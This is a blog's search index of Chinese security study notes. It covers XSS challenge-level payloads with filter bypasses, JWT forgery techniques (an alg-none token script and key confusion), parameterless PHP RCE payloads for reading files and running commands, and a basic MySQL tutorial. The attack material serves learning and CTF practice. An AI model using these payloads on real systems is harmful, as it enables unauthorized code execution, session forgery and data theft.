<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>XSS</title>
    <url>/2021/03/05/XSS/</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a href="http://test.ctf8.com/" target="_blank" rel="noopener">xss闯关</a></p>
<h6 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h6><p>没有过滤直接构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h6 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h6><p>没有过滤或用引号包裹参数，所输入代码被直接执行，导致形成XSS漏洞。</p>
<p>我们可以闭合语句，直接在输入框输入payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>或者用<code>on</code>事件，需要点击一下输入框</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1)&gt;</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;img scr&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;123&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h6 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h6><p><code>htmlspecialchars()</code>函数将<code>&lt;&gt;</code>等一些字符实体化</p>
<p>因此这里我们采用 <code>onclick</code>触发事件 <code>onclick</code> 事件直接包含在&lt;&gt;内，可直接被执行，观察源代码为单引号，把value给闭合掉,%0a用做换行使input标签语法正确，要再点一下输入框。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;onclick&#x3D;alert(1)%0a</span><br><span class="line">&#39;onclick&#x3D;&#39;javascript:alert(1)&#39;</span><br><span class="line">&#39;onmouseover&#x3D;&#39;alert(1)&#39;</span><br></pre></td></tr></table></figure>

<h6 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h6><p><code>replace()</code>函数将<code>&lt;&gt;</code>替换为空</p>
<p>使用<code>oninput</code>事件和<code>onchange</code>事件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onchange&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&quot;oninput&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h6 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h6><p><code>on</code>和<code>script</code>标签被过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h6 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h6><p><code>href</code>和<code>on</code>和<code>script</code>标签被过滤</p>
<p>使用大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Onclick&#x3D;&#39;javascript:alert(1)&#39;</span><br></pre></td></tr></table></figure>

<h6 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h6><p><code>href</code>和<code>on</code>和<code>script</code>被过滤</p>
<p>采用双写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;&#x2F;sscriptcript&gt;</span><br><span class="line">&quot;&gt;&lt;a hhrefref&#x3D;javasscriptcript:alert(1)&gt;</span><br><span class="line">&quot;oonnclick&#x3D;&#39;javasscriptcript:alert(1)&#39;</span><br></pre></td></tr></table></figure>

<h6 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h6><p>过滤“和&lt;&gt;和javascript</p>
<p>友情链接相当于<code>&lt;a&gt;</code>标签注入，使用HTML字符转换绕过，将<code>javascript</code>转换为十进制或十六进制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) &#x2F;&#x2F;再进行html字符转换</span><br></pre></td></tr></table></figure>

<h6 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h6><p>判断链接中是否有http://</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) &#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h6 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h6><p>首先查看注入点，哪个的参数有回应哪个就是注入点，之后把<code>type</code>改为<code>text</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyword&#x3D;t_link&#x3D;1&amp;t_history&#x3D;2&amp;t_sort&#x3D;3</span><br><span class="line">&amp;t_sort&#x3D;&quot; type&#x3D;&quot;text&quot; onclick&#x3D;alert()%0a</span><br></pre></td></tr></table></figure>

<h6 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h6><p><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;]</code>获得http请求中的<code>Referer</code></p>
<p>抓包添加</p>
<p><code>Referer:&quot;type=&quot;button&quot; onclick=&quot;javascript:alert(1)</code></p>
<h6 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h6><p><code>$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code>获得http请求中的<code>User-Agent</code></p>
<p>抓包修改</p>
<p><code>User-Agent:&quot;type=&quot;button&quot; onclick=&quot;javascript:alert(1)</code></p>
<h6 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h6><p><code>$str11=$_COOKIE[&quot;user&quot;]</code>获得http请求中的<code>Cookie</code></p>
<p>抓包修改</p>
<p><code>Cookie:user=&quot;type=&quot;button&quot; onclick=&quot;javascript:alert(1)</code></p>
<h6 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h6><p>过滤替换script和空格和/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?keyword&#x3D;test&lt;img%0dsrc&#x3D;1%0donerror&#x3D;alert(1)&gt; </span><br><span class="line">?keyword&#x3D;&lt;a%0ahref&#x3D;“javasc%0aript:alert(1)”&gt;</span><br></pre></td></tr></table></figure>

<h6 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h6><p>将两个输入值用等号连接.embeb标签定义嵌入的内容，比如插件。</p>
<p> 添加空格使结构发生变化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D;a&amp;arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2021/02/01/jwt/</url>
    <content><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookie &#x2F;session &#x2F;jwt  不同点</span><br><span class="line"></span><br><span class="line">1.对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，</span><br><span class="line">甚至信息伪造，这肯定不是我们期望的。</span><br><span class="line">2.session:客户端在服务端登陆成功之后，服务端会生成一个sessionID，</span><br><span class="line">返回给客户端，客户端将sessionID保存到cookie中，session保存在服务端，</span><br><span class="line">当客户访问量增加时，服务端就需要存储大量的session会话，对服务器有很大的考验</span><br><span class="line">3.jwt:在身份验证中，当用户使用他们的凭证成功登录时，</span><br><span class="line">JSON Web Token将被返回并且必须保存在本地</span><br></pre></td></tr></table></figure>

<p>客户端身份经过服务器验证通过后，会生成带有签名的 JSON 对象并将它返回给客户端。<strong>客户端在收到这个 JSON 对象后存储起来</strong></p>
<p>在以后的请求中客户端将 JSON 对象连同请求内容一起发送给服务器，服务器收到请求后通过 JSON 对象标识用户，如果验证不通过则不返回请求的数据。</p>
<p>验证不通过的情况有很多，比如签名不正确、无权限等。<strong>在 JWT 中服务器不保存任何会话数据</strong> ，使得服务器更加容易扩展。</p>
<h1 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h1><h2 id="header"><a href="#header" class="headerlink" title="header"></a><strong>header</strong></h2><p>头部承载两部分信息：</p>
<ul>
<li>声明类型，这里是jwt</li>
<li>声明加密算法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#39;typ&#39;: &#39;JWT&#39;, </span><br><span class="line">  &#39;alg&#39;: &#39;HS256&#39; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a><strong>payload</strong></h2><p><strong>载荷就是存放有效信息的地方。这些有效信息包含三个部分</strong></p>
<ul>
<li><strong>标准中注册的声明</strong></li>
<li><strong>公共的声明</strong></li>
<li><strong>私有的声明</strong></li>
</ul>
<p><strong>标准中注册的声明</strong> :</p>
<ul>
<li>iss: jwt签发者</li>
<li>sub: jwt所面向的用户</li>
<li>aud: 接收jwt的一方</li>
<li>exp: jwt的过期时间，这个过期时间必须要大于签发时间</li>
<li>nbf: 定义在什么时间之前，该jwt都是不可用的.</li>
<li>iat: jwt的签发时间</li>
<li>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</li>
</ul>
<p><strong>公共的声明</strong> ：</p>
<p>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可进行解码.</p>
<p><strong>私有的声明</strong> ：</p>
<p>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;user&quot;:&quot;admin&quot;,</span><br><span class="line">   &quot;iat&quot;:1611129081</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a><strong>signature</strong></h2><p><strong>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</strong></p>
<ul>
<li><strong>header (base64后的)</strong></li>
<li><strong>payload (base64后的)</strong></li>
<li><strong>secret</strong></li>
</ul>
<p>这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。加密方式如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">'.'</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">'secret'</span>);</span><br></pre></td></tr></table></figure>

<p>值得注意的是，编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”_”。</p>
<h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h1><h2 id="签名无效"><a href="#签名无效" class="headerlink" title="签名无效"></a><strong>签名无效</strong></h2><p>当用户端提交请求给应用程序，服务端可能没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制。</p>
<p>直接修改payload内容，生成新token</p>
<p>node 的jsonwebtoken库存在一个缺陷，也是jwt的常见攻击手法，当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密，此时key为空。</p>
<h2 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a><strong>空加密算法</strong></h2><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
<p><strong>将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证</strong></p>
<p>因为alg为none,所以只要把signature设置为空（即不添加signature字段），提交到服务器，token都可以通过服务器的验证。</p>
<p>使用以下脚本构造jwt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">  <span class="string">"iss"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1611125518</span>,</span><br><span class="line">  <span class="string">"exp"</span>: <span class="number">1611132718</span>,</span><br><span class="line">  <span class="string">"nbf"</span>: <span class="number">1611125518</span>,</span><br><span class="line">  <span class="string">"sub"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"jti"</span>: <span class="string">"d185987a4bc016713e7398aa1fea6f7a0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"none"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line">jwt_token = jwt.encode(token_dict,  <span class="comment"># payload, 有效载体</span></span><br><span class="line">                       <span class="string">""</span>,  <span class="comment"># 进行加密签名的密钥</span></span><br><span class="line">                       algorithm=<span class="string">"none"</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       headers=headers </span><br><span class="line">                       <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       )</span><br><span class="line"></span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>

<h2 id="修改算法RS256为HS256（非对称密码–-gt-对称密码）"><a href="#修改算法RS256为HS256（非对称密码–-gt-对称密码）" class="headerlink" title="修改算法RS256为HS256（非对称密码–&gt;对称密码）"></a><strong>修改算法RS256为HS256（非对称密码–&gt;对称密码）</strong></h2><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code></p>
<blockquote>
<p>HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证<br>RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p>
</blockquote>
<p>在这两种算法中都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
<p>如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。更改算法为HS256，即不存在公钥私钥问题，因为HMAC对称密码算法只有一个key</p>
<h2 id="爆破密钥"><a href="#爆破密钥" class="headerlink" title="爆破密钥"></a><strong>爆破密钥</strong></h2><p>JWT 的密钥爆破需要在一定的前提下进行：</p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已签名的token</li>
<li>签名用的密钥不复杂（弱密钥）</li>
</ul>
<p>使用方法：jwtcrack+token</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/106073624" target="_blank" rel="noopener">jwt及jwt伪造</a></p>
]]></content>
  </entry>
  <entry>
    <title>无参数rce</title>
    <url>/2021/03/05/%E6%97%A0%E5%8F%82%E6%95%B0rce/</url>
    <content><![CDATA[<h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><h3 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="无参数任意文件读取"><a href="#无参数任意文件读取" class="headerlink" title="无参数任意文件读取"></a>无参数任意文件读取</h3><h5 id="1-查看当前目录所有文件名"><a href="#1-查看当前目录所有文件名" class="headerlink" title="1.查看当前目录所有文件名"></a>1.查看当前目录所有文件名</h5><p><code>print_r(scandir(&#39;.&#39;));</code></p>
<p>绝对路径：<code>print_r(realpath(&#39;.&#39;));</code></p>
<p>​                   <code>print_r(scandir(getcwd()))</code></p>
<p>如何构造参数<code>&quot;.&quot;</code>：</p>
<p>1.<code>localeconv()</code>函数</p>
<p>返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>&quot;.&quot;</code>。</p>
<p>使用方法：<code>print_r(scandir(current(localeconv())));</code></p>
<p>​                   <code>print_r(scandir(pos(localeconv())));</code>                            </p>
<p>​                   <code>print_r(scandir(reset(localeconv())));</code></p>
<p>2.构造<code>chr(46)</code></p>
<p><code>chr(46)</code>就是字符<code>&quot;.&quot;</code></p>
<p><code>current(localtime(time()))</code>最多60秒得到46</p>
<p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回46</p>
<p><code>ord(hebrevc(crypt(time())))</code>概率返回46</p>
<p><code>ord(strrev(crypt(serialize(array()))))</code>概率返回46</p>
<h5 id="2-读取当前目录文件"><a href="#2-读取当前目录文件" class="headerlink" title="2.读取当前目录文件"></a>2.读取当前目录文件</h5><p><code>show_source()</code>、<code>readfile</code>、<code>highlight_file</code>、<code>file_get_contents</code>、<code>readgzfile()</code>函数可读取文件。</p>
<p>查看文件名的方法输出的是数组，文件名是数组的值，使用如下函数改变指针位置读取文件的数组：</p>
<p><code>current()/pos()</code>：返回数组中当前单元</p>
<p><code>each()</code>：返回数组当前的键/值对并将数组指针前移一位</p>
<p><code>end()</code>：将数组指针指向最后一个单元</p>
<p><code>next()</code>：将数组指针向前移动一位</p>
<p><code>prev()</code>：将数组指针倒回一位</p>
<p>使用<code>array_reverse()</code> 以相反的元素顺序返回数组</p>
<p>读倒数第二个数组：</p>
<p><code>show_source(next(array_reverse(scandir(getcwd()))));</code></p>
<p>使用<code>array_rand(array_flip())</code>，<code>array_flip()</code>交换数组的键和值</p>
<p><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<p>使用<code>array_rand()</code>随机返回一个数组</p>
<p><code>show_source(array_rand(array_flip(scandir(getcwd()))));</code></p>
<p>多刷新几次就能读到</p>
<h5 id="3-查看上一级目录文件名"><a href="#3-查看上一级目录文件名" class="headerlink" title="3.查看上一级目录文件名"></a>3.查看上一级目录文件名</h5><p><code>dirname()</code> ：返回路径中的目录部分。若传入的绝对路径不包含文件名，则返回上一级目录路径；若包含文件名，则返回当前目录路径。</p>
<p>查看上一级目录所有文件名：</p>
<p><code>print_r(scandir(dirname(getcwd())));</code></p>
<p>构造<code>&quot;..&quot;</code>：</p>
<p><code>scandir(getcwd())</code>出现的数组第二个就是<code>&quot;..&quot;</code>，用<code>next()</code>获取</p>
<p><code>print_r(scandir(next(scandir(getcwd()))));</code></p>
<p><code>next(scandir(chr(ord(hebrevc(crypt(time()))))))</code>也可获得<code>&quot;..&quot;</code></p>
<h5 id="4-读取上级目录文件"><a href="#4-读取上级目录文件" class="headerlink" title="4.读取上级目录文件"></a>4.读取上级目录文件</h5><p><code>chdir()</code> ：改变当前工作目录</p>
<p>使用<code>dirname()</code>读取上级目录文件：</p>
<p><code>show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></p>
<p>构造<code>&quot;..&quot;</code>切换路径并读取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">或</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br><span class="line">或</span><br><span class="line">if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<h5 id="5-查看和读取根目录文件"><a href="#5-查看和读取根目录文件" class="headerlink" title="5.查看和读取根目录文件"></a>5.查看和读取根目录文件</h5><p><code>strrev(crypt(serialize(array())))</code>所获得的字符串第一位有几率是<code>/</code></p>
<p>有一定权限才能读取到根目录文件：</p>
<p><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></p>
<p>或</p>
<p><code>if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));</code></p>
<h3 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h3><p>1.<code>getallheaders()</code>和<code>apache_request_headers()</code>函数</p>
<p>只能在<code>Apache</code>环境下使用：</p>
<p><code>Payload:?code=eval(pos(getallheaders()))</code></p>
<p>同时<code>post</code>数据<code>a=phpinfo()</code>或者修改<code>User-Agent</code>为<code>phpinfo()</code></p>
<p>2.<code>get_defined_vars()</code>函数</p>
<p>该函数会返回全局变量的值，如get、post、cookie、file数据</p>
<p>使用<code>get</code>的数据：</p>
<p><code>Payload:?leon=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></p>
<p>使用<code>file</code>的数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"system('whoami');"</span>: <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#data = &#123;</span></span><br><span class="line"><span class="comment">#"code":"eval(pos(pos(end(get_defined_vars()))));"</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));'</span>, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>

<p>3.<code>session_id()</code>函数</p>
<p> 可以用来获取/设置 当前会话 ID。</p>
<p>session需要使用<code>session_start()</code>开启，然后返回参数给<code>session_id()</code></p>
<p>但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</p>
<p>但是<code>hex2bin()</code>函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用<code>hex2bin()</code>即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print&#39;phpinfo();&#39;.encode(&#39;hex&#39;)</span><br><span class="line">706870696e666f28293b</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID&#x3D;706870696e666f28293b</span><br></pre></td></tr></table></figure>

<p>4.<code>getenv()</code> 函数</p>
<p>获取环境变量的值(<code>PHP7.1</code>以后)</p>
<p>方法同1</p>
]]></content>
  </entry>
  <entry>
    <title>mysql学习笔记</title>
    <url>/2021/01/19/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>title: mysql学习笔记</p>
<p>categories: 笔记</p>
<h2 id="一-MySQL下载及初始化"><a href="#一-MySQL下载及初始化" class="headerlink" title="一.MySQL下载及初始化"></a>一.MySQL下载及初始化</h2><p>在管理员模式下打开cmd</p>
<p>cd 到 文件的 bin 目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:</span><br><span class="line">cd D:\tools\mysql\mysql-8.0.19-winx64\bin</span><br></pre></td></tr></table></figure>

<p>安装文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqld --install mysql</span><br></pre></td></tr></table></figure>

<p>初始化 (初次无密码登录)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqld --initialize-insecure</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure>

 <a id="more"></a>

<p>登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root</span><br></pre></td></tr></table></figure>

<p>修改密码 (注意：使用反引号 ` )</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER USER &#96;root&#96;@&#96;localhost&#96; IDENTIFIED BY &#96;******&#96;</span><br></pre></td></tr></table></figure>

<h2 id="二-使用"><a href="#二-使用" class="headerlink" title="二.使用"></a>二.使用</h2><h3 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1.基本操作"></a>1.基本操作</h3><p>启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure>

<p>登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">password:123456</span><br></pre></td></tr></table></figure>

<p>退出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>关闭服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net stop mysql</span><br></pre></td></tr></table></figure>

<p>显示数据库列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p>进入指定数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use 库名;</span><br></pre></td></tr></table></figure>

<p>显示数据库中的表列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p>进入并显示数据表（两种方法）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show columns from 表名;</span><br><span class="line">describe 表名;</span><br></pre></td></tr></table></figure>

<h3 id="2-检索数据"><a href="#2-检索数据" class="headerlink" title="2.检索数据"></a>2.检索数据</h3><p>检索列（用 ‘ * ’ 表示所有）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 列名1，列名2 from 表名;</span><br><span class="line">select distinct 列名 from 表名; (隐藏重复行)</span><br><span class="line">select 列名 from 表名 limit x,y; (显示列中从x行开始取y行)</span><br></pre></td></tr></table></figure>

<h3 id="3-排序数据"><a href="#3-排序数据" class="headerlink" title="3.排序数据"></a>3.排序数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 order by 列名 desc; (降序)</span><br><span class="line">select 列名 from 表名 order by 列名 asc; (升序)</span><br></pre></td></tr></table></figure>

<h3 id="4-过滤数据"><a href="#4-过滤数据" class="headerlink" title="4.过滤数据"></a>4.过滤数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 where 列名 &#x3D; x;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">操作符</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">=</td>
<td align="center">等于</td>
</tr>
<tr>
<td align="center">&lt;&gt; 或 !=</td>
<td align="center">不等于</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">小于</td>
</tr>
<tr>
<td align="center">&lt;=</td>
<td align="center">小于等于</td>
</tr>
<tr>
<td align="center">between and 或 in ( , )</td>
<td align="center">指定两个值之间</td>
</tr>
<tr>
<td align="center">and</td>
<td align="center">同时满足条件</td>
</tr>
<tr>
<td align="center">or</td>
<td align="center">满足任一条件</td>
</tr>
</tbody></table>
<p>注：order by 子句应放在 where 子句之后 </p>
<p>​        返回数据不包括空值 </p>
<p>​        and 的优先级大于 or                         </p>
<p>检查空值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 where 列名 is NULL;</span><br></pre></td></tr></table></figure>

<p>使用通配符（%表示任意多字符，_ 只表示一个字符）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 where like &#39;a%e&#39;;</span><br></pre></td></tr></table></figure>











]]></content>
  </entry>
</search>
